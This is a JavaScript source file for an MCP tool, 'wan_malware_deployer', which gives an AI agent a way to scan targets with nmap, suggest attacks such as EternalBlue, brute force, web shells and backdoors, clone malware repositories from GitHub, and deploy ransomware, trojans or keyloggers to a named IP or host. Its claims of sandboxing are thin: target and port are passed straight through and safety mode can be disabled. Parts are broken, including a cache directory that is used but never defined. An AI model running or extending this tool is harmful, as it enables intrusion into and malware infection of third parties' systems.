import { z } from "zod";
import { exec } from "node:child_process";
import { promisify } from "node:util";
import * as fs from "node:fs/promises";
import * as path from "node:path";
import { createHash } from "node:crypto";
import { logger } from "../../utils/logger.js";
import { MalwareSandboxManager } from "./docker/sandbox-manager.js";
import { FallbackSandboxManager } from "./docker/fallback-sandbox.js";

const execAsync = promisify(exec);

// Safety configuration - ALL operations within sandbox only
const SAFETY_CONFIG = {
    MAX_EXECUTION_TIME: 300000, // 5 minutes
    MAX_PAYLOAD_SIZE: 50 * 1024 * 1024, // 50MB
    ALLOWED_EXTENSIONS: ['.exe', '.bat', '.cmd', '.ps1', '.sh', '.py', '.js', '.jar', '.dll'],
    // All directories are now sandbox-contained
    SANDBOX_BASE_DIR: path.join(process.cwd(), 'malware-sandbox'),
    SANDBOX_PAYLOADS_DIR: path.join(process.cwd(), 'malware-sandbox', 'payloads'),
    SANDBOX_OUTPUT_DIR: path.join(process.cwd(), 'malware-sandbox', 'output'),
    SANDBOX_LOGS_DIR: path.join(process.cwd(), 'malware-sandbox', 'logs'),
    SANDBOX_ADDITIONAL_DIR: path.join(process.cwd(), 'malware-sandbox', 'additional')
};

// Global sandbox manager instance
let sandboxManager = null;

// Initialize sandbox manager
async function initializeSandbox() {
    if (!sandboxManager) {
        try {
            // Check if Docker is available
            try {
                await execAsync("docker --version", { timeout: 5000 });
                logger.info("ðŸ³ Docker detected, using Docker sandbox");
                sandboxManager = new MalwareSandboxManager();
            } catch {
                logger.warn("âš ï¸ Docker not available, using fallback sandbox");
                sandboxManager = new FallbackSandboxManager();
            }
            
            await sandboxManager.initialize();
            await sandboxManager.downloadMalwareRepository();
            logger.info("âœ… Sandbox initialized successfully");
        } catch (error) {
            logger.error(`Failed to initialize sandbox: ${error.message}`);
            throw error;
        }
    }
    return sandboxManager;
}

// Ensure safety directories exist - ALL within sandbox only
async function ensureSafetyDirectories() {
    for (const dir of [SAFETY_CONFIG.SANDBOX_BASE_DIR, SAFETY_CONFIG.SANDBOX_PAYLOADS_DIR, SAFETY_CONFIG.SANDBOX_OUTPUT_DIR, SAFETY_CONFIG.SANDBOX_LOGS_DIR, SAFETY_CONFIG.SANDBOX_ADDITIONAL_DIR]) {
        try {
            await fs.mkdir(dir, { recursive: true });
        } catch (error) {
            logger.warn(`Failed to create sandbox directory ${dir}: ${error.message}`);
        }
    }
}

// Safe GitHub repository fetcher
async function fetchMalwareRepo() {
    const repoUrl = "https://github.com/Da2dalus/The-MALWARE-Repo.git";
    const repoPath = SAFETY_CONFIG.REPO_CACHE_DIR;
    
    try {
        // Check if repo exists and is recent (less than 24 hours old)
        const gitPath = path.join(repoPath, '.git');
        const stats = await fs.stat(gitPath).catch(() => null);
        
        if (stats) {
            const age = Date.now() - stats.mtime.getTime();
            if (age < 24 * 60 * 60 * 1000) { // 24 hours
                logger.info("Using cached malware repository");
                return repoPath;
            }
        }
        
        // Clone or update repository
        logger.info("Fetching malware repository from GitHub...");
        await execAsync(`git clone --depth 1 ${repoUrl} ${repoPath}`, { timeout: 60000 });
        
        return repoPath;
    } catch (error) {
        logger.error(`Failed to fetch malware repository: ${error.message}`);
        throw new Error(`Repository fetch failed: ${error.message}`);
    }
}

// Search GitHub repositories for additional deployables
async function searchGitHubRepositories(query, limit = 10) {
    try {
        logger.info(`Searching GitHub for repositories: ${query}`);
        
        // Use GitHub API to search for repositories
        const searchUrl = `https://api.github.com/search/repositories?q=${encodeURIComponent(query)}&sort=stars&order=desc&per_page=${limit}`;
        
        const response = await fetch(searchUrl, {
            headers: {
                'Accept': 'application/vnd.github.v3+json',
                'User-Agent': 'MCP-God-Mode-WAN-Deployer'
            }
        });
        
        if (!response.ok) {
            throw new Error(`GitHub API error: ${response.status} ${response.statusText}`);
        }
        
        const data = await response.json();
        const repositories = [];
        
        for (const repo of data.items) {
            // Check if repository contains potential malware/payloads
            const isMalwareRepo = checkIfMalwareRepository(repo);
            
            if (isMalwareRepo) {
                repositories.push({
                    name: repo.name,
                    full_name: repo.full_name,
                    description: repo.description,
                    stars: repo.stargazers_count,
                    language: repo.language,
                    url: repo.html_url,
                    clone_url: repo.clone_url,
                    size: repo.size,
                    updated_at: repo.updated_at,
                    is_malware_repo: true,
                    potential_payloads: await estimatePayloadCount(repo)
                });
            }
        }
        
        return repositories;
    } catch (error) {
        logger.error(`GitHub search failed: ${error.message}`);
        throw new Error(`GitHub search failed: ${error.message}`);
    }
}

// Check if repository contains potential malware/payloads
function checkIfMalwareRepository(repo) {
    const malwareKeywords = [
        'malware', 'payload', 'exploit', 'backdoor', 'trojan', 'virus', 'ransomware',
        'rootkit', 'keylogger', 'botnet', 'spyware', 'adware', 'worm', 'pentest',
        'hacking', 'security', 'vulnerability', 'cve', 'metasploit', 'payloads'
    ];
    
    const repoText = `${repo.name} ${repo.description || ''}`.toLowerCase();
    
    return malwareKeywords.some(keyword => repoText.includes(keyword));
}

// Estimate number of potential payloads in repository
async function estimatePayloadCount(repo) {
    try {
        // Get repository contents
        const contentsUrl = `https://api.github.com/repos/${repo.full_name}/contents`;
        const response = await fetch(contentsUrl, {
            headers: {
                'Accept': 'application/vnd.github.v3+json',
                'User-Agent': 'MCP-God-Mode-WAN-Deployer'
            }
        });
        
        if (!response.ok) {
            return 0;
        }
        
        const contents = await response.json();
        let payloadCount = 0;
        
        for (const item of contents) {
            if (item.type === 'file') {
                const ext = path.extname(item.name).toLowerCase();
                if (SAFETY_CONFIG.ALLOWED_EXTENSIONS.includes(ext)) {
                    payloadCount++;
                }
            } else if (item.type === 'dir') {
                // Estimate based on directory name
                const dirName = item.name.toLowerCase();
                if (dirName.includes('payload') || dirName.includes('exploit') || 
                    dirName.includes('malware') || dirName.includes('backdoor')) {
                    payloadCount += 2; // Estimate 2 payloads per relevant directory
                }
            }
        }
        
        return Math.min(payloadCount, 50); // Cap at 50 for display purposes
    } catch (error) {
        return 0;
    }
}

// Clone additional repository for payloads
async function cloneAdditionalRepository(repoUrl, repoName) {
    try {
        const additionalRepoPath = path.join(SAFETY_CONFIG.REPO_CACHE_DIR, 'additional', repoName);
        
        // Check if already exists
        try {
            await fs.access(additionalRepoPath);
            logger.info(`Repository ${repoName} already exists, updating...`);
            await execAsync(`cd "${additionalRepoPath}" && git pull`, { timeout: 30000 });
        } catch {
            // Clone new repository
            logger.info(`Cloning additional repository: ${repoName}`);
            await execAsync(`git clone --depth 1 ${repoUrl} "${additionalRepoPath}"`, { timeout: 60000 });
        }
        
        return additionalRepoPath;
    } catch (error) {
        logger.error(`Failed to clone repository ${repoName}: ${error.message}`);
        throw new Error(`Repository clone failed: ${error.message}`);
    }
}

// Get available payloads from repository
async function getAvailablePayloads(repoPath) {
    try {
        const payloads = [];
        const entries = await fs.readdir(repoPath, { withFileTypes: true });
        
        for (const entry of entries) {
            if (entry.isDirectory() && !entry.name.startsWith('.')) {
                const payloadPath = path.join(repoPath, entry.name);
                const files = await fs.readdir(payloadPath);
                
                // Check for executable files
                const executables = files.filter(file => {
                    const ext = path.extname(file).toLowerCase();
                    return SAFETY_CONFIG.ALLOWED_EXTENSIONS.includes(ext);
                });
                
                if (executables.length > 0) {
                    payloads.push({
                        name: entry.name,
                        path: payloadPath,
                        executables: executables,
                        description: await getPayloadDescription(payloadPath),
                        source: 'main_repo'
                    });
                }
            }
        }
        
        // Also check additional repositories
        const additionalRepoPath = path.join(SAFETY_CONFIG.REPO_CACHE_DIR, 'additional');
        try {
            const additionalRepos = await fs.readdir(additionalRepoPath, { withFileTypes: true });
            
            for (const repo of additionalRepos) {
                if (repo.isDirectory()) {
                    const repoPath = path.join(additionalRepoPath, repo.name);
                    const additionalPayloads = await getAvailablePayloads(repoPath);
                    
                    // Mark as from additional repository
                    additionalPayloads.forEach(payload => {
                        payload.source = `additional_${repo.name}`;
                    });
                    
                    payloads.push(...additionalPayloads);
                }
            }
        } catch {
            // No additional repositories
        }
        
        return payloads;
    } catch (error) {
        logger.error(`Failed to enumerate payloads: ${error.message}`);
        throw new Error(`Payload enumeration failed: ${error.message}`);
    }
}

// Get payload description from README or info files
async function getPayloadDescription(payloadPath) {
    try {
        const readmeFiles = ['README.md', 'readme.txt', 'info.txt', 'description.txt'];
        
        for (const readme of readmeFiles) {
            const readmePath = path.join(payloadPath, readme);
            try {
                const content = await fs.readFile(readmePath, 'utf-8');
                return content.substring(0, 200) + (content.length > 200 ? '...' : '');
            } catch {
                continue;
            }
        }
        
        return "No description available";
    } catch {
        return "No description available";
    }
}

// Enhanced target analysis with service detection
async function analyzeTarget(target) {
    try {
        logger.info(`Analyzing target system: ${target}`);
        
        const analysis = {
            target: target,
            openPorts: [],
            services: [],
            vulnerabilities: [],
            osInfo: null,
            attackRecommendations: []
        };
        
        // Port scanning with service detection
        try {
            const { stdout } = await execAsync(`nmap -sS -sV -O -T4 --top-ports 1000 ${target}`, { timeout: 60000 });
            const lines = stdout.split('\n');
            
            for (const line of lines) {
                // Parse open ports and services
                const portMatch = line.match(/(\d+)\/tcp\s+open\s+(\w+)\s+(.+)/);
                if (portMatch) {
                    const port = parseInt(portMatch[1]);
                    const service = portMatch[2];
                    const version = portMatch[3].trim();
                    
                    analysis.openPorts.push({
                        port: port,
                        protocol: 'tcp',
                        service: service,
                        version: version
                    });
                    
                    analysis.services.push({
                        port: port,
                        service: service,
                        version: version,
                        risk: assessServiceRisk(service, version)
                    });
                }
                
                // Parse OS information
                const osMatch = line.match(/Running: (.+)/);
                if (osMatch) {
                    analysis.osInfo = osMatch[1];
                }
            }
        } catch {
            // Fallback to basic port scanning
            const commonPorts = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3389, 5900, 8080];
            
            for (const port of commonPorts) {
                try {
                    const { stdout } = await execAsync(`timeout 2 bash -c "echo > /dev/tcp/${target}/${port}"`, { timeout: 5000 });
                    analysis.openPorts.push({
                        port: port,
                        protocol: 'tcp',
                        service: 'unknown',
                        version: 'unknown'
                    });
                } catch {
                    // Port is closed or filtered
                }
            }
        }
        
        // Generate attack recommendations based on analysis
        analysis.attackRecommendations = generateAttackRecommendations(analysis);
        
        return analysis;
    } catch (error) {
        logger.error(`Target analysis failed: ${error.message}`);
        return {
            target: target,
            openPorts: [],
            services: [],
            vulnerabilities: [],
            osInfo: null,
            attackRecommendations: [],
            error: error.message
        };
    }
}

// Assess service risk level
function assessServiceRisk(service, version) {
    const highRiskServices = ['ssh', 'telnet', 'ftp', 'smb', 'rdp', 'vnc'];
    const mediumRiskServices = ['http', 'https', 'smtp', 'pop3', 'imap'];
    
    if (highRiskServices.includes(service.toLowerCase())) {
        return 'high';
    } else if (mediumRiskServices.includes(service.toLowerCase())) {
        return 'medium';
    } else {
        return 'low';
    }
}

// Generate attack recommendations based on target analysis
function generateAttackRecommendations(analysis) {
    const recommendations = [];
    
    // Analyze open services and suggest appropriate attacks
    for (const service of analysis.services) {
        const { port, service: serviceName, version, risk } = service;
        
        switch (serviceName.toLowerCase()) {
            case 'ssh':
                recommendations.push({
                    payload: 'ssh_bruteforce',
                    description: 'SSH brute force attack',
                    confidence: 0.8,
                    reason: `SSH service detected on port ${port}`,
                    risk: 'high'
                });
                break;
                
            case 'smb':
                recommendations.push({
                    payload: 'eternalblue',
                    description: 'EternalBlue SMB exploit',
                    confidence: 0.9,
                    reason: `SMB service detected on port ${port} - potential for EternalBlue exploit`,
                    risk: 'critical'
                });
                break;
                
            case 'rdp':
                recommendations.push({
                    payload: 'rdp_bruteforce',
                    description: 'RDP brute force attack',
                    confidence: 0.7,
                    reason: `RDP service detected on port ${port}`,
                    risk: 'high'
                });
                break;
                
            case 'http':
                recommendations.push({
                    payload: 'web_shell',
                    description: 'Web shell deployment',
                    confidence: 0.6,
                    reason: `HTTP service detected on port ${port}`,
                    risk: 'medium'
                });
                break;
                
            case 'ftp':
                recommendations.push({
                    payload: 'ftp_bruteforce',
                    description: 'FTP brute force attack',
                    confidence: 0.7,
                    reason: `FTP service detected on port ${port}`,
                    risk: 'high'
                });
                break;
        }
    }
    
    // Add generic recommendations based on OS
    if (analysis.osInfo) {
        if (analysis.osInfo.toLowerCase().includes('windows')) {
            recommendations.push({
                payload: 'windows_persistence',
                description: 'Windows persistence mechanism',
                confidence: 0.8,
                reason: 'Windows system detected',
                risk: 'high'
            });
        } else if (analysis.osInfo.toLowerCase().includes('linux')) {
            recommendations.push({
                payload: 'linux_backdoor',
                description: 'Linux backdoor deployment',
                confidence: 0.7,
                reason: 'Linux system detected',
                risk: 'medium'
            });
        }
    }
    
    // Sort by confidence and risk
    return recommendations.sort((a, b) => {
        if (a.risk === 'critical' && b.risk !== 'critical') return -1;
        if (b.risk === 'critical' && a.risk !== 'critical') return 1;
        return b.confidence - a.confidence;
    });
}

// Port scanning functionality (legacy support)
async function scanTargetPorts(target) {
    const analysis = await analyzeTarget(target);
    return analysis.openPorts;
}

// Safe payload execution in Docker sandbox
async function executePayload(payload, target, port, timeout = 60000) {
    try {
        // Initialize sandbox if not already done
        const sandbox = await initializeSandbox();
        
        // Find main executable
        const mainExecutable = payload.executables.find(exe => 
            ['.exe', '.bat', '.cmd', '.ps1', '.sh', '.py', '.js'].includes(path.extname(exe).toLowerCase())
        );
        
        if (!mainExecutable) {
            throw new Error("No suitable executable found in payload");
        }
        
        const executablePath = path.join(payload.path, mainExecutable);
        
        // Execute payload in Docker sandbox
        logger.info(`Executing payload in Docker sandbox: ${mainExecutable} against ${target}:${port}`);
        
        const result = await sandbox.executePayload(executablePath, target, port, timeout);
        
        return {
            success: result.success,
            stdout: result.stdout,
            stderr: result.stderr,
            exitCode: result.output?.exitCode || (result.success ? 0 : 1),
            sandboxOutput: result.output,
            sandboxLogs: result.logs
        };
        
    } catch (error) {
        logger.error(`Payload execution failed: ${error.message}`);
        return {
            success: false,
            stdout: "",
            stderr: error.message,
            exitCode: 1,
            sandboxOutput: null,
            sandboxLogs: null
        };
    }
}

// Main tool registration
export function registerWanMalwareDeployer(server) {
    server.registerTool("wan_malware_deployer", {
        description: "ðŸš€ **WAN Malware Deployer** - Deploy malware payloads from The-MALWARE-Repo over WAN with port scanning, payload selection, and safe execution in contained environments. Includes comprehensive safety features, cross-platform support, and natural language interface.",
        inputSchema: {
            mode: z.enum(["command", "natural_language", "list_payloads", "scan_target", "analyze_target", "search_repositories", "clone_repository"]).default("natural_language").describe("Operation mode: 'command' for structured commands, 'natural_language' for conversational interface, 'list_payloads' to see available payloads, 'scan_target' for port scanning only, 'analyze_target' for comprehensive target analysis with attack suggestions, 'search_repositories' to find additional payload repositories, 'clone_repository' to add new repository"),
            target: z.string().optional().describe("Target IP address or hostname to attack (e.g., '192.168.1.100', 'target.com')"),
            payload_name: z.string().optional().describe("Name of the malware payload to deploy (use list_payloads mode to see available options)"),
            port: z.number().optional().describe("Specific port to target (if not provided, will scan for open ports)"),
            timeout: z.number().optional().describe("Execution timeout in milliseconds (default: 60000ms, max: 300000ms)"),
            natural_language_command: z.string().optional().describe("Natural language command for malware deployment (e.g., 'scan and attack 192.168.1.100 with ransomware', 'deploy trojan to target.com on port 8080', 'analyze target 192.168.1.100 and suggest attacks')"),
            safety_mode: z.boolean().default(true).describe("Enable safety mode with sandboxing and timeouts (recommended: true)"),
            scan_only: z.boolean().default(false).describe("Only perform port scanning without deploying payloads"),
            search_query: z.string().optional().describe("Search query for finding additional payload repositories (e.g., 'windows exploits', 'linux backdoors')"),
            repository_url: z.string().optional().describe("GitHub repository URL to clone for additional payloads"),
            repository_name: z.string().optional().describe("Name for the cloned repository")
        },
        outputSchema: {
            success: z.boolean(),
            message: z.string(),
            mode: z.string(),
            target: z.string().optional(),
            scan_results: z.array(z.object({
                port: z.number(),
                protocol: z.string(),
                service: z.string(),
                version: z.string().optional()
            })).optional(),
            target_analysis: z.object({
                target: z.string(),
                openPorts: z.array(z.object({
                    port: z.number(),
                    protocol: z.string(),
                    service: z.string(),
                    version: z.string().optional()
                })),
                services: z.array(z.object({
                    port: z.number(),
                    service: z.string(),
                    version: z.string(),
                    risk: z.string()
                })),
                osInfo: z.string().optional(),
                attackRecommendations: z.array(z.object({
                    payload: z.string(),
                    description: z.string(),
                    confidence: z.number(),
                    reason: z.string(),
                    risk: z.string()
                }))
            }).optional(),
            available_payloads: z.array(z.object({
                name: z.string(),
                description: z.string(),
                executables: z.array(z.string()),
                source: z.string().optional()
            })).optional(),
            repository_search_results: z.array(z.object({
                name: z.string(),
                full_name: z.string(),
                description: z.string(),
                stars: z.number(),
                language: z.string().optional(),
                url: z.string(),
                potential_payloads: z.number()
            })).optional(),
            deployment_result: z.object({
                payload_name: z.string(),
                success: z.boolean(),
                stdout: z.string(),
                stderr: z.string(),
                execution_time: z.number()
            }).optional(),
            safety_warnings: z.array(z.string()).optional()
        }
    }, async ({ mode, target, payload_name, port, timeout = 60000, natural_language_command, safety_mode = true, scan_only = false, search_query, repository_url, repository_name }) => {
        try {
            // Initialize safety directories
            await ensureSafetyDirectories();
            
            const warnings = [];
            if (!safety_mode) {
                warnings.push("âš ï¸ SAFETY MODE DISABLED - Payloads will execute without sandboxing!");
            }
            
            // Validate timeout
            if (timeout > SAFETY_CONFIG.MAX_EXECUTION_TIME) {
                timeout = SAFETY_CONFIG.MAX_EXECUTION_TIME;
                warnings.push(`Timeout limited to ${SAFETY_CONFIG.MAX_EXECUTION_TIME}ms for safety`);
            }
            
            // Handle different modes
            switch (mode) {
                case "list_payloads":
                    logger.info("Fetching available payloads from malware repository...");
                    try {
                        const sandbox = await initializeSandbox();
                        const payloads = await sandbox.listAvailablePayloads();
                        
                        return {
                            content: [],
                            structuredContent: {
                                success: true,
                                message: `Found ${payloads.length} available payloads in Docker sandbox`,
                                mode: "list_payloads",
                                available_payloads: payloads.map(p => ({
                                    name: p.name,
                                    description: p.description,
                                    executables: p.executables,
                                    source: "docker_sandbox"
                                })),
                                safety_warnings: warnings
                            }
                        };
                    } catch (error) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: `Failed to list payloads: ${error.message}`,
                                mode: "list_payloads",
                                safety_warnings: warnings
                            }
                        };
                    }
                
                case "scan_target":
                    if (!target) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Target is required for port scanning",
                                mode: "scan_target"
                            }
                        };
                    }
                    
                    const scanResults = await scanTargetPorts(target);
                    
                    return {
                        content: [],
                        structuredContent: {
                            success: true,
                            message: `Port scan completed for ${target}`,
                            mode: "scan_target",
                            target: target,
                            scan_results: scanResults,
                            safety_warnings: warnings
                        }
                    };
                
                case "analyze_target":
                    if (!target) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Target is required for target analysis",
                                mode: "analyze_target"
                            }
                        };
                    }
                    
                    logger.info(`Performing comprehensive target analysis: ${target}`);
                    const analysis = await analyzeTarget(target);
                    
                    return {
                        content: [],
                        structuredContent: {
                            success: true,
                            message: `Target analysis completed for ${target}`,
                            mode: "analyze_target",
                            target: target,
                            target_analysis: analysis,
                            safety_warnings: warnings
                        }
                    };
                
                case "search_repositories":
                    if (!search_query) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Search query is required for repository search",
                                mode: "search_repositories"
                            }
                        };
                    }
                    
                    logger.info(`Searching GitHub repositories: ${search_query}`);
                    const repositories = await searchGitHubRepositories(search_query);
                    
                    return {
                        content: [],
                        structuredContent: {
                            success: true,
                            message: `Found ${repositories.length} potential payload repositories`,
                            mode: "search_repositories",
                            repository_search_results: repositories.map(r => ({
                                name: r.name,
                                full_name: r.full_name,
                                description: r.description,
                                stars: r.stars,
                                language: r.language,
                                url: r.url,
                                potential_payloads: r.potential_payloads
                            })),
                            safety_warnings: warnings
                        }
                    };
                
                case "clone_repository":
                    if (!repository_url || !repository_name) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Repository URL and name are required for cloning",
                                mode: "clone_repository",
                                safety_warnings: warnings
                            }
                        };
                    }
                    
                    logger.info(`Cloning additional repository: ${repository_name} from ${repository_url}`);
                    try {
                        const sandbox = await initializeSandbox();
                        const repoPath = await sandbox.cloneAdditionalRepository(repository_url, repository_name);
                        
                        return {
                            content: [],
                            structuredContent: {
                                success: true,
                                message: `Successfully cloned repository: ${repository_name} into sandbox`,
                                mode: "clone_repository",
                                repository_name: repository_name,
                                repository_url: repository_url,
                                repository_path: repoPath,
                                safety_warnings: warnings
                            }
                        };
                    } catch (error) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: `Failed to clone repository: ${error.message}`,
                                mode: "clone_repository",
                                safety_warnings: warnings
                            }
                        };
                    }
                
                case "natural_language":
                    if (!natural_language_command) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Natural language command is required",
                                mode: "natural_language"
                            }
                        };
                    }
                    
                    // Parse natural language command
                    const parsed = parseNaturalLanguageCommand(natural_language_command);
                    if (!parsed.success) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: parsed.error,
                                mode: "natural_language"
                            }
                        };
                    }
                    
                    // Use parsed parameters for deployment
                    return await executeDeployment(parsed.target, parsed.payload_name, parsed.port, timeout, safety_mode, warnings);
                
                case "command":
                default:
                    if (!target || !payload_name) {
                        return {
                            content: [],
                            structuredContent: {
                                success: false,
                                message: "Target and payload_name are required for command mode",
                                mode: "command"
                            }
                        };
                    }
                    
                    return await executeDeployment(target, payload_name, port, timeout, safety_mode, warnings);
            }
            
        } catch (error) {
            logger.error(`WAN Malware Deployer error: ${error.message}`);
            return {
                content: [],
                structuredContent: {
                    success: false,
                    message: `Deployment failed: ${error.message}`,
                    mode: mode || "command"
                }
            };
        }
    });
}

// Parse natural language commands
function parseNaturalLanguageCommand(command) {
    const lowerCommand = command.toLowerCase();
    
    // Check for analysis commands
    if (lowerCommand.includes('analyze') || lowerCommand.includes('suggest') || lowerCommand.includes('recommend')) {
        const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
        const hostnameRegex = /\b[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\b/;
        
        const targetMatch = command.match(ipRegex) || command.match(hostnameRegex);
        const target = targetMatch ? targetMatch[0] : null;
        
        if (target) {
            return {
                success: true,
                mode: 'analyze_target',
                target: target
            };
        }
    }
    
    // Check for search commands
    if (lowerCommand.includes('search') || lowerCommand.includes('find') || lowerCommand.includes('look for')) {
        // Extract search terms
        const searchTerms = command.replace(/search|find|look for|repositories?|payloads?/gi, '').trim();
        if (searchTerms) {
            return {
                success: true,
                mode: 'search_repositories',
                search_query: searchTerms
            };
        }
    }
    
    // Check for list commands
    if (lowerCommand.includes('list') || lowerCommand.includes('show') || lowerCommand.includes('available')) {
        return {
            success: true,
            mode: 'list_payloads'
        };
    }
    
    // Extract target (IP or hostname)
    const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
    const hostnameRegex = /\b[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\b/;
    
    const targetMatch = command.match(ipRegex) || command.match(hostnameRegex);
    const target = targetMatch ? targetMatch[0] : null;
    
    // Extract port
    const portMatch = command.match(/port\s+(\d+)|:(\d+)/);
    const port = portMatch ? parseInt(portMatch[1] || portMatch[2]) : null;
    
    // Extract payload type
    const payloadKeywords = {
        'ransomware': 'ransomware',
        'trojan': 'trojan',
        'backdoor': 'backdoor',
        'keylogger': 'keylogger',
        'rootkit': 'rootkit',
        'worm': 'worm',
        'virus': 'virus',
        'botnet': 'botnet',
        'spyware': 'spyware',
        'adware': 'adware',
        'ssh_bruteforce': 'ssh_bruteforce',
        'eternalblue': 'eternalblue',
        'rdp_bruteforce': 'rdp_bruteforce',
        'web_shell': 'web_shell',
        'ftp_bruteforce': 'ftp_bruteforce',
        'windows_persistence': 'windows_persistence',
        'linux_backdoor': 'linux_backdoor'
    };
    
    let payload_name = null;
    for (const [keyword, payload] of Object.entries(payloadKeywords)) {
        if (lowerCommand.includes(keyword)) {
            payload_name = payload;
            break;
        }
    }
    
    if (!target) {
        return { success: false, error: "Could not identify target IP or hostname in command" };
    }
    
    if (!payload_name) {
        return { success: false, error: "Could not identify payload type in command" };
    }
    
    return {
        success: true,
        mode: 'command',
        target: target,
        payload_name: payload_name,
        port: port
    };
}

// Execute deployment process
async function executeDeployment(target, payload_name, port, timeout, safety_mode, warnings) {
    const startTime = Date.now();
    
    try {
        // Fetch repository and get payloads
        logger.info(`Fetching payload: ${payload_name}`);
        const repoPath = await fetchMalwareRepo();
        const payloads = await getAvailablePayloads(repoPath);
        
        // Find requested payload
        const payload = payloads.find(p => p.name.toLowerCase().includes(payload_name.toLowerCase()));
        if (!payload) {
            return {
                content: [],
                structuredContent: {
                    success: false,
                    message: `Payload '${payload_name}' not found. Available payloads: ${payloads.map(p => p.name).join(', ')}`,
                    mode: "command",
                    target: target,
                    available_payloads: payloads.map(p => ({
                        name: p.name,
                        description: p.description,
                        executables: p.executables
                    }))
                }
            };
        }
        
        // Scan for open ports if not specified
        let targetPort = port;
        let scanResults = [];
        
        if (!targetPort) {
            logger.info(`Scanning target ${target} for open ports...`);
            scanResults = await scanTargetPorts(target);
            
            if (scanResults.length === 0) {
                return {
                    content: [],
                    structuredContent: {
                        success: false,
                        message: `No open ports found on target ${target}`,
                        mode: "command",
                        target: target,
                        scan_results: scanResults
                    }
                };
            }
            
            // Use first open port
            targetPort = scanResults[0].port;
            logger.info(`Using port ${targetPort} for deployment`);
        }
        
        // Execute payload
        logger.info(`Deploying ${payload.name} to ${target}:${targetPort}`);
        const result = await executePayload(payload, target, targetPort, timeout);
        
        const executionTime = Date.now() - startTime;
        
        return {
            content: [],
            structuredContent: {
                success: result.success,
                message: result.success ? 
                    `Successfully deployed ${payload.name} to ${target}:${targetPort}` : 
                    `Failed to deploy ${payload.name} to ${target}:${targetPort}`,
                mode: "command",
                target: target,
                scan_results: scanResults,
                deployment_result: {
                    payload_name: payload.name,
                    success: result.success,
                    stdout: result.stdout,
                    stderr: result.stderr,
                    execution_time: executionTime
                },
                safety_warnings: warnings
            }
        };
        
    } catch (error) {
        logger.error(`Deployment execution failed: ${error.message}`);
        return {
            content: [],
            structuredContent: {
                success: false,
                message: `Deployment failed: ${error.message}`,
                mode: "command",
                target: target
            }
        };
    }
}
